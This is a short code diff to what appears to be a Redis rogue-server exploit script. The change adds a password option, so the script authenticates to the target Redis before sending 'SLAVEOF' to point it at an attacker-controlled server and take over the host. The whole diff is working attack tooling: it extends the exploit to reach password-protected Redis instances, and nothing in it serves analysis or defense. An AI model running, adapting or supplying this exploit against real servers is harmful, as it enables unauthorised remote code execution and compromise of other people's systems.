@@ -112,9 +112,15 @@ def interact(remote):
     except KeyboardInterrupt:
         return
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, passwd):
     # expolit
     remote = Remote(rhost, rport)
+
+    # auth 
+    if passwd:
+        remote.do(f"AUTH {passwd}")
+    
+    # slave of
     remote.do(f"SLAVEOF {lhost} {lport}")
 
     # read original config
@@ -155,6 +161,8 @@ if __name__ == '__main__':
             help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
             help="rogue server listen port, default 21000", default=21000)
+    parser.add_option("--passwd", dest="passwd", type="string",
+            help="redis password")
 
     (options, args) = parser.parse_args()
     if not options.rh or not options.lh:
@@ -162,4 +170,4 @@ if __name__ == '__main__':
     #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
     print(f"TARGET {options.rh}:{options.rp}")
     print(f"SERVER {options.lh}:{options.lp}")
-    runserver(options.rh, options.rp, options.lh, options.lp)
+    runserver(options.rh, options.rp, options.lh, options.lp, options.passwd)
